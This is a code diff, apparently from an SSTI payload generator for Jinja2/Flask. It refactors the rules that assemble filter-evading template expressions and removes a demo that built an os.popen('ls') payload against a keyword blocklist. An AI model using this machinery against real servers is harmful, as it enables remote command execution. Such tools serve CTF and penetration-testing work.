@@ -10,11 +10,11 @@ PayloadGen：将用户提供的生成目标一层层展开，并使用WAF检测�
     根据展开结果返回相应的表达式。
 """
 
-# pylint: skip-file
+# make pylint shut up, these are rules for generating expression, not normal code containing logic.
+# pylint: disable=wildcard-import,unused-wildcard-import,missing-function-docstring,logging-format-interpolation,unused-argument,consider-using-f-string,too-many-lines
 # flake8: noqa
 
 import re
-import time
 import logging
 import sys
 import math
@@ -138,12 +138,7 @@ gen_weight_default = {
 }
 
 precedence = [
-    [
-        "enclose",
-        "literal",
-        "flask_context_var",
-        "jinja_context_var"
-    ],
+    ["enclose", "literal", "flask_context_var", "jinja_context_var"],
     [
         "item",
         "attribute",
@@ -194,7 +189,7 @@ precedence = {name: i for i, lst in enumerate(precedence) for name in lst}
 def expression_gen(f: ExpressionGenerator):
     gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
     if not gen_type:
-        raise Exception(f"Error found when register payload generator {f.__name__}")
+        raise RuntimeError(f"Error found when register payload generator {f.__name__}")
     expression_gens[gen_type.group(1)].append(f)
 
 
@@ -202,7 +197,7 @@ def hashable(o):
     try:
         _ = hash(o)
         return True
-    except Exception:
+    except TypeError:
         return False
 
 
@@ -292,47 +287,28 @@ class PayloadGenerator:
         )
         self.context = context if context else {}
         self.cache = {}
-        # 给.generate_by_list的列表，指定每一个生成目标应该使用什么函数生成
-        self.generate_funcs: List[
-            Tuple[
-                Callable[[Target], bool],
-                Callable[[Target], Union[PayloadGeneratorResult, None]],
-            ]
-        ]
-        self.generate_funcs = [  # type: ignore
-            (
-                (lambda target: target[0] == LITERAL),
-                self.literal_generate,
-            ),
-            ((lambda target: target[0] == UNSATISFIED), self.unsatisfied_generate),
-            ((lambda target: target[0] == ONEOF), self.oneof_generate),
-            ((lambda target: target[0] == EXPRESSION), self.expression_generate),
-            ((lambda target: target[0] == ENCLOSE_UNDER), self.enclose_under_generate),
-            (
-                (lambda target: target[0] == WITH_CONTEXT_VAR),
-                self.with_context_var_generate,
-            ),
-            (
-                (lambda target: target[0] == FLASK_CONTEXT_VAR),
-                self.flask_context_var_generate,
-            ),
-            (
-                (lambda target: target[0] == JINJA_CONTEXT_VAR),
-                self.jinja_context_var_generate,
-            ),
-            (
-                (lambda target: hashable(target) and target in self.cache),
-                (lambda target: self.cache[target]),
-            ),
-            ((lambda target: True), self.common_generate),
-        ]
         self.used_count = defaultdict(int)
         self.detect_mode = detect_mode
         if detect_mode == DETECT_MODE_FAST:
-            for k in gen_weight_default:
-                self.used_count[k] += gen_weight_default[k]
+            for k, v in gen_weight_default.items():
+                self.used_count[k] += v
         self.environment = environment
         self.callback = callback if callback else (lambda x, y: None)
+
+    # it is correct pylint, it returns a internal decorator.
+    def create_generate_func_register():  # pylint: disable=no-method-argument
+        generate_funcs = []
+
+        def register(checker_func):
+            def _wraps(runner_func):
+                generate_funcs.append((checker_func, runner_func))
+                return runner_func
+
+            return _wraps
+
+        return generate_funcs, register
+
+    generate_funcs, register_generate_func = create_generate_func_register()
 
     def generate_by_list(
         self, targets: List[Target]
@@ -348,9 +324,9 @@ class PayloadGenerator:
         str_result, used_context, tree = "", {}, []
         for target in targets:
             for checker, runner in self.generate_funcs:
-                if not checker(target):
+                if not checker(self, target):
                     continue
-                result = runner(target)
+                result = runner(self, target)
                 if result is None:
                     return None
                 s, c, subs = result
@@ -359,11 +335,12 @@ class PayloadGenerator:
                 tree.append((target, subs))
                 break
             else:
-                raise Exception("it shouldn't runs this line")
+                raise RuntimeError("it shouldn't runs this line")
         if not self.waf_func(str_result):
             return None
         return str_result, used_context, tree
 
+    @register_generate_func(lambda self, target: target[0] == LITERAL)
     def literal_generate(
         self, target: LiteralTarget
     ) -> Union[PayloadGeneratorResult, None]:
@@ -379,6 +356,21 @@ class PayloadGenerator:
         #     return None
         return (target[1], {}, None)
 
+    @register_generate_func(
+        lambda self, target: hashable(target) and target in self.cache
+    )
+    def cache_generate(self, target: Target) -> Union[PayloadGeneratorResult, None]:
+        """为已经缓存的生成目标生成payload
+
+        Args:
+            target (Target): 生成目标
+
+        Returns:
+            Union[PayloadGeneratorResult, None]: 生成结果
+        """
+        return self.cache.get(target, None)
+
+    @register_generate_func(lambda self, target: target[0] == EXPRESSION)
     def expression_generate(
         self, target: ExpressionTarget
     ) -> Union[PayloadGeneratorResult, None]:
@@ -396,6 +388,7 @@ class PayloadGenerator:
         ), repr(target)[:100]
         return self.generate_by_list(target[2])
 
+    @register_generate_func(lambda self, target: target[0] == ENCLOSE_UNDER)
     def enclose_under_generate(
         self, target: EncloseUnderTarget
     ) -> Union[PayloadGeneratorResult, None]:
@@ -419,16 +412,23 @@ class PayloadGenerator:
         assert result_precedence is not None, str_result + repr(tree)
         if result_precedence < target[1]:
             logger.debug(
-                "enclose_under_generate: result_precedence < target[1], result_precedence=%d, target[1]=%s", result_precedence, target[1]
+                (
+                    "enclose_under_generate: result_precedence < "
+                    + "target[1], result_precedence=%d, target[1]=%s"
+                ),
+                result_precedence,
+                target[1],
             )
             ret = self.generate_by_list([(ENCLOSE, target[2])])
             return ret
         return str_result, used_context, tree
 
+    @register_generate_func(lambda self, target: target[0] == UNSATISFIED)
     def unsatisfied_generate(self, target: UnsatisfiedTarget) -> None:
         """直接拒绝类型为unsatisfied的生成目标"""
         return None
 
+    @register_generate_func(lambda self, target: target[0] == ONEOF)
     def oneof_generate(
         self, target: OneofTarget
     ) -> Union[PayloadGeneratorResult, None]:
@@ -447,6 +447,7 @@ class PayloadGenerator:
                 return ret
         return None
 
+    @register_generate_func(lambda self, target: target[0] == WITH_CONTEXT_VAR)
     def with_context_var_generate(
         self, target: WithContextVarTarget
     ) -> Union[PayloadGeneratorResult, None]:
@@ -460,6 +461,7 @@ class PayloadGenerator:
         """
         return ("", {target[1]: self.context[target[1]]}, None)
 
+    @register_generate_func(lambda self, target: target[0] == JINJA_CONTEXT_VAR)
     def jinja_context_var_generate(
         self, target: JinjaContextVarTarget
     ) -> Union[PayloadGeneratorResult, None]:
@@ -473,6 +475,7 @@ class PayloadGenerator:
         """
         return (target[1], {}, None)
 
+    @register_generate_func(lambda self, target: target[0] == FLASK_CONTEXT_VAR)
     def flask_context_var_generate(
         self, target: FlaskContextVarTarget
     ) -> Union[PayloadGeneratorResult, None]:
@@ -488,6 +491,7 @@ class PayloadGenerator:
             return None
         return (target[1], {}, None)
 
+    @register_generate_func(lambda self, target: True)
     def common_generate(self, gen_req: Target) -> Union[PayloadGeneratorResult, None]:
         """为剩下所有类型的生成目标生成对应的payload, 遍历对应的expression_gen，拿到
         对应的生成目标列表并尝试使用这个列表生成payload
@@ -559,7 +563,7 @@ class PayloadGenerator:
                 self.cache[gen_req] = ret
             self.used_count[gen.__name__] += 1
             return ret
-        if gen_type not in (CHAINED_ATTRIBUTE_ITEM, ATTRIBUTE, ITEM):
+        if gen_type not in (CHAINED_ATTRIBUTE_ITEM, ATTRIBUTE, ITEM, PLUS, MULTIPLY, STRING_CONCAT):
             logger.info(
                 "{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
                     failed=colored("red", "failed"),
@@ -651,6 +655,7 @@ def gen_string_concat_tilde(context: dict, a, b) -> List[LiteralTarget]:
 
 # TODO: add  f'|attr("\\x5f\\x5fadd\\x5f\\x5f")({n})'
 
+
 @expression_gen
 def gen_plus_normal(context: dict, a, b):
     a = (ENCLOSE_UNDER, precedence["plus"], a)
@@ -712,6 +717,22 @@ def gen_function_call_normal(context: dict, function_target, args_target_list):
         ]
         + join_target((LITERAL, ","), args_target_list)
         + [
+            (LITERAL, ")"),
+        ]
+    )
+    return [(EXPRESSION, precedence["function_call"], target_list)]
+
+
+@expression_gen
+def gen_function_call_normal2(context: dict, function_target, args_target_list):
+    target_list = (
+        [
+            (ENCLOSE_UNDER, precedence["function_call"], function_target),
+            (LITERAL, "("),
+        ]
+        + join_target((LITERAL, ","), args_target_list)
+        + [
+            (LITERAL, ","),
             (LITERAL, ")"),
         ]
     )
@@ -935,13 +956,15 @@ def gen_positive_integer_recurmulnoastral(context: dict, value: int):
         if a > pieces_max:
             continue
         if b == 0:
-            alternative = [
-                (MULTIPLY, (POSITIVE_INTEGER, a), (POSITIVE_INTEGER, i))
-            ]
+            alternative = [(MULTIPLY, (POSITIVE_INTEGER, a), (POSITIVE_INTEGER, i))]
             alternatives.insert(0, alternative)
         else:
             alternative = [
-                (PLUS, (MULTIPLY, (POSITIVE_INTEGER, a), (POSITIVE_INTEGER, i)), (POSITIVE_INTEGER, b))
+                (
+                    PLUS,
+                    (MULTIPLY, (POSITIVE_INTEGER, a), (POSITIVE_INTEGER, i)),
+                    (POSITIVE_INTEGER, b),
+                )
             ]
             alternatives.append(alternative)
     if not alternatives:
@@ -962,7 +985,7 @@ def gen_positive_integer_length(context: dict, value: int):
         [
             (LITERAL, "("),
         ]
-        + join_target((LITERAL, ","), [(ZERO, ) for _ in range(value)])
+        + join_target((LITERAL, ","), [(ZERO,) for _ in range(value)])
         + [
             (LITERAL, ")"),
         ]
@@ -972,10 +995,15 @@ def gen_positive_integer_length(context: dict, value: int):
             (LITERAL, "("),
         ]
         + [
-            (ONEOF, *[
-                join_target((LITERAL, ","), [(LITERAL, chr(c)) for _ in range(value)])
-                for c in range(ord("a"), ord("z") + 1)
-            ])
+            (
+                ONEOF,
+                *[
+                    join_target(
+                        (LITERAL, ","), [(LITERAL, chr(c)) for _ in range(value)]
+                    )
+                    for c in range(ord("a"), ord("z") + 1)
+                ],
+            )
         ]
         + [
             (LITERAL, ")"),
@@ -1024,21 +1052,12 @@ def gen_positive_integer_numbersum2(context: dict, value: int):
     target_list = [(ONEOF, *alternatives)]
     return [(EXPRESSION, precedence["filter"], target_list)]
 
-@expression_gen
-def gen_positive_integer_numbersum2(context: dict, value: int):
-    if value < 5:
-        return [(UNSATISFIED,)]
-    alternatives = []
-    for i in range(min(40, value - 1), 3, -1):
-        inner = ",".join([str(i)] * (value // i) + [str(value % i)])
-        alternatives.append([(LITERAL, "({})|sum".format(inner))])
-    target_list = [(ONEOF, *alternatives)]
-    return [(EXPRESSION, precedence["filter"], target_list)]
 
 @expression_gen
 def gen_positive_integer_count(context: dict, value: int):
     target_list = [(LITERAL, "({})|count".format(",".join("x" * value)))]
     return [(EXPRESSION, precedence["filter"], target_list)]
+
 
 @expression_gen
 def gen_positive_integer_onesum1(context: dict, value: int):
@@ -1378,7 +1397,6 @@ def gen_string_percent_namespace(context):
 
 @expression_gen
 def gen_string_percent_dictbatch(context):
-    # "{{((dict(dict(dict(a=1)|tojson|batch(2))|batch(2))|join,dict(c=1)|join,dict()|trim|last)|join).format((9,9,9,9,1)|sum)}}"
     whatever_onedigit_number = (ONEOF, *[[(INTEGER, i)] for i in range(1, 10)])
     target_list = [
         (
@@ -1443,12 +1461,13 @@ def gen_string_percent_lipsumcomplex(context):
 def gen_string_percent_urlencodelong(context):
     target_list = [
         (LITERAL, "(lipsum,)|map("),
-        (ONEOF, 
+        (
+            ONEOF,
             [(LITERAL, "dict(ur=x,le=x,nco=x,de=x)|join")],
             [(LITERAL, "'ur''lencode'")],
             [(LITERAL, '"ur""lencode"')],
         ),
-        (LITERAL, "(lipsum,)|map(dict(ur=x,le=x,nco=x,de=x)|join)|list|first|first")
+        (LITERAL, ")|first|first"),
     ]
     return [(EXPRESSION, precedence["enclose"], target_list)]
 
@@ -1588,7 +1607,6 @@ def gen_string_percent_lower_c_replaceconcat(context):
 
 @expression_gen
 def gen_string_percent_lower_c_cycler(context):
-    # cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower
     target_list = [
         (LITERAL, "cycler|pprint|list|pprint|urlencode|batch("),
         (INTEGER, 10),
@@ -1731,7 +1749,10 @@ def gen_string_many_format_c_complex(context, num):
     fomat_c_target_list = [
         (
             LITERAL,
-            "{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,",
+            (
+                "{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)"
+                + "|replace(1|string,{}|join)|replace(2|string,"
+            ),
         ),
         (STRING_LOWERC,),
         (LITERAL, ")"),
@@ -1992,7 +2013,7 @@ def gen_char_num2(context, c):
     target_list = [
         (
             LITERAL,
-            f"(",
+            "(",
         ),
         (INTEGER, int(c)),
         (LITERAL, ")|string"),
@@ -2076,66 +2097,6 @@ def gen_string_removedunder(context: dict, value: str):
     return [(STRING_CONCAT, (STRING_CONCAT, twounderline, middle), twounderline)]
 
 
-# 以下规则生成的payload显著长于原string
-
-
-@expression_gen
-def gen_string_x1(context: dict, value: str):
-    if any(ord(c) >= 128 for c in value):
-        return [(UNSATISFIED,)]
-    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
-    target_list = [(LITERAL, '"{}"'.format(target))]
-    return [(EXPRESSION, precedence["literal"], target_list)]
-
-
-@expression_gen
-def gen_string_x2(context: dict, value: str):
-    if any(ord(c) >= 128 for c in value):
-        return [(UNSATISFIED,)]
-    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
-    target_list = [(LITERAL, "'{}'".format(target))]
-    return [(EXPRESSION, precedence["literal"], target_list)]
-
-
-@expression_gen
-def gen_string_u1(context: dict, value: str):
-    if any(ord(c) >= 128 for c in value):
-        return [(UNSATISFIED,)]
-    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
-    target_list = [(LITERAL, "'{}'".format(target))]
-    return [(EXPRESSION, precedence["literal"], target_list)]
-
-
-@expression_gen
-def gen_string_u2(context: dict, value: str):
-    if any(ord(c) >= 128 for c in value):
-        return [(UNSATISFIED,)]
-    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
-    target_list = [(LITERAL, "'{}'".format(target))]
-    return [(EXPRESSION, precedence["literal"], target_list)]
-
-
-@expression_gen
-def gen_string_o1(context: dict, value: str):
-    if any(ord(c) >= 128 for c in value):
-        return [(UNSATISFIED,)]
-    target = "".join("\\" + oct(ord(c))[2:] for c in value)
-    target_list = [(LITERAL, "'{}'".format(target))]
-    return [(EXPRESSION, precedence["literal"], target_list)]
-
-
-@expression_gen
-def gen_string_o2(context: dict, value: str):
-    if any(ord(c) >= 128 for c in value):
-        return [(UNSATISFIED,)]
-    target = "".join("\\" + oct(ord(c))[2:] for c in value)
-    target_list = [(LITERAL, "'{}'".format(target))]
-    return [(EXPRESSION, precedence["literal"], target_list)]
-
-
-# TODO: 把下面这几个不会让payload长度显著增加的规则扔到上面
-
-
 @expression_gen
 def gen_string_reverse1(context: dict, value: str):
     chars = [c if c != "'" else "\\'" for c in value]
@@ -2202,6 +2163,63 @@ def gen_string_lowerfilter2(context: dict, value: str):
     chars = [c if c != '"' else '\\"' for c in value.upper()]
     target_list = [(LITERAL, '"{}"|lower'.format("".join(chars)))]
     return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+# 以下规则生成的payload显著长于原string
+
+
+@expression_gen
+def gen_string_x1(context: dict, value: str):
+    if any(ord(c) >= 128 for c in value):
+        return [(UNSATISFIED,)]
+    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
+    target_list = [(LITERAL, '"{}"'.format(target))]
+    return [(EXPRESSION, precedence["literal"], target_list)]
+
+
+@expression_gen
+def gen_string_x2(context: dict, value: str):
+    if any(ord(c) >= 128 for c in value):
+        return [(UNSATISFIED,)]
+    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
+    target_list = [(LITERAL, "'{}'".format(target))]
+    return [(EXPRESSION, precedence["literal"], target_list)]
+
+
+@expression_gen
+def gen_string_u1(context: dict, value: str):
+    if any(ord(c) >= 128 for c in value):
+        return [(UNSATISFIED,)]
+    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
+    target_list = [(LITERAL, "'{}'".format(target))]
+    return [(EXPRESSION, precedence["literal"], target_list)]
+
+
+@expression_gen
+def gen_string_u2(context: dict, value: str):
+    if any(ord(c) >= 128 for c in value):
+        return [(UNSATISFIED,)]
+    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
+    target_list = [(LITERAL, "'{}'".format(target))]
+    return [(EXPRESSION, precedence["literal"], target_list)]
+
+
+@expression_gen
+def gen_string_o1(context: dict, value: str):
+    if any(ord(c) >= 128 for c in value):
+        return [(UNSATISFIED,)]
+    target = "".join("\\" + oct(ord(c))[2:] for c in value)
+    target_list = [(LITERAL, "'{}'".format(target))]
+    return [(EXPRESSION, precedence["literal"], target_list)]
+
+
+@expression_gen
+def gen_string_o2(context: dict, value: str):
+    if any(ord(c) >= 128 for c in value):
+        return [(UNSATISFIED,)]
+    target = "".join("\\" + oct(ord(c))[2:] for c in value)
+    target_list = [(LITERAL, "'{}'".format(target))]
+    return [(EXPRESSION, precedence["literal"], target_list)]
 
 
 # TODO: 解决反斜杠没有正确转义的问题
@@ -2328,12 +2346,16 @@ def gen_string_formatfunc2(context: dict, value: str):
     k = [k for k, v in context.values() if v == "{:c}"][0]
     cs = (MULTIPLY, k, (INTEGER, len(value)))
     format_func = (ATTRIBUTE, (LITERAL, cs), "format")
-    target_list = [
-        (ENCLOSE_UNDER, precedence["function_call"], format_func),
-        (LITERAL, "("),
-        (LITERAL, ",".join(str(ord(c)) for c in value)),
-        (LITERAL, ")"),
-    ]
+    target_list = (
+        [
+            (ENCLOSE_UNDER, precedence["function_call"], format_func),
+            (LITERAL, "("),
+        ]
+        + join_target((LITERAL, ","), [(INTEGER, ord(c)) for c in value])
+        + [
+            (LITERAL, ")"),
+        ]
+    )
     return [(EXPRESSION, precedence["function_call"], target_list)]
 
 
@@ -2342,19 +2364,20 @@ def gen_string_formatfunc3(context: dict, value: str):
     # (FORMAT(97,98,99))
     # FORMAT = (CS.format)
     # CS = (C*L)
+    logger.debug("gen_string_formatfunc3: %s", value)
     if re.match("^[a-z]+$", value):  # avoid infinite recursion
         return [(UNSATISFIED,)]
-    # cs = "(({c})*{l})".format(
-    #     c="{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=x)|join)",
-    #     l=len(value)
-    # )
     format_func = (ATTRIBUTE, (STRING_MANY_FORMAT_C, len(value)), "format")
-    target_list = [
-        (ENCLOSE_UNDER, precedence["function_call"], format_func),
-        (LITERAL, "("),
-        (LITERAL, ",".join(str(ord(c)) for c in value)),
-        (LITERAL, ")"),
-    ]
+    target_list = (
+        [
+            (ENCLOSE_UNDER, precedence["function_call"], format_func),
+            (LITERAL, "("),
+        ]
+        + join_target((LITERAL, ","), [(INTEGER, ord(c)) for c in value])
+        + [
+            (LITERAL, ")"),
+        ]
+    )
     return [(EXPRESSION, precedence["function_call"], target_list)]
 
 
@@ -2414,6 +2437,17 @@ def gen_attribute_attrfilter(context, obj_req, attr_name):
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
+@expression_gen
+def gen_attribute_attrfilter2(context, obj_req, attr_name):
+    target_list = [
+        (ENCLOSE_UNDER, precedence["filter"], obj_req),
+        (LITERAL, "|attr("),
+        (STRING, attr_name),
+        (LITERAL, ",)"),
+    ]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
 # ---
 
 
@@ -2422,7 +2456,7 @@ def gen_item_normal1(context, obj_req, item_name):
     if not re.match("[A-Za-z_]([A-Za-z0-9_]+)?", item_name):
         return [(UNSATISFIED,)]
     target_list = [
-        obj_req,
+        (ENCLOSE_UNDER, precedence["item"], obj_req),
         (LITERAL, "."),
         (LITERAL, item_name),
     ]
@@ -2443,10 +2477,29 @@ def gen_item_normal2(context, obj_req, item_name):
 @expression_gen
 def gen_item_dunderfunc(context, obj_req, item_name):
     target_list = [
-        (ATTRIBUTE, obj_req, "__getitem__"),
+        (
+            ENCLOSE_UNDER,
+            precedence["function_call"],
+            (ATTRIBUTE, obj_req, "__getitem__"),
+        ),
         (LITERAL, "("),
         (STRING, item_name),
         (LITERAL, ")"),
+    ]
+    return [(EXPRESSION, precedence["function_call"], target_list)]
+
+
+@expression_gen
+def gen_item_dunderfunc2(context, obj_req, item_name):
+    target_list = [
+        (
+            ENCLOSE_UNDER,
+            precedence["function_call"],
+            (ATTRIBUTE, obj_req, "__getitem__"),
+        ),
+        (LITERAL, "("),
+        (STRING, item_name),
+        (LITERAL, ",)"),
     ]
     return [(EXPRESSION, precedence["function_call"], target_list)]
 
@@ -2456,13 +2509,13 @@ def gen_item_dunderfunc(context, obj_req, item_name):
 
 @expression_gen
 def gen_class_attribute_literal(context, obj_req, attr_name):
-    # obj.__class__.attr
+    class_target = (
+        ATTRIBUTE,
+        obj_req,
+        "__class__",
+    )
     target_list = [
-        (
-            ATTRIBUTE,
-            obj_req,
-            "__class__",
-        ),
+        (ENCLOSE_UNDER, precedence["attribute"], class_target),
         (LITERAL, "." + attr_name),
     ]
     return [(EXPRESSION, precedence["attribute"], target_list)]
@@ -2470,17 +2523,32 @@ def gen_class_attribute_literal(context, obj_req, attr_name):
 
 @expression_gen
 def gen_class_attribute_attrfilter(context, obj_req, attr_name):
-    # obj.__class__.attr
+    class_target = (
+        ATTRIBUTE,
+        obj_req,
+        "__class__",
+    )
     target_list = [
-        (LITERAL, "("),
-        (
-            ATTRIBUTE,
-            obj_req,
-            "__class__",
-        ),
+        (ENCLOSE_UNDER, precedence["filter"], class_target),
         (LITERAL, "|attr("),
         (STRING, attr_name),
-        (LITERAL, "))"),
+        (LITERAL, ")"),
+    ]
+    return [(EXPRESSION, precedence["filter"], target_list)]
+
+
+@expression_gen
+def gen_class_attribute_attrfilter2(context, obj_req, attr_name):
+    class_target = (
+        ATTRIBUTE,
+        obj_req,
+        "__class__",
+    )
+    target_list = [
+        (ENCLOSE_UNDER, precedence["filter"], class_target),
+        (LITERAL, "|attr("),
+        (STRING, attr_name),
+        (LITERAL, ",)"),
     ]
     return [(EXPRESSION, precedence["filter"], target_list)]
 
@@ -2884,37 +2952,3 @@ def gen_os_popen_read_eval(context, cmd):
             ),
         ),
     ]
-
-
-if __name__ == "__main__":
-    import time
-    import functools
-
-    @functools.lru_cache(100)
-    def waf_func(payload: str):
-        time.sleep(0.2)
-        return all(
-            word not in payload
-            for word in [
-                "'",
-                '"',
-                ".",
-                "_",
-                "import",
-                "request",
-                "url",
-                "\\x",
-                "os",
-                "system",
-                "\\u",
-                "22",
-            ]
-        )
-
-    payload = generate(
-        OS_POPEN_READ,
-        "ls",
-        waf_func=waf_func,
-        context={"loo": 100, "lo": 10, "l": 1, "un": "_"},
-    )
-    print(payload)
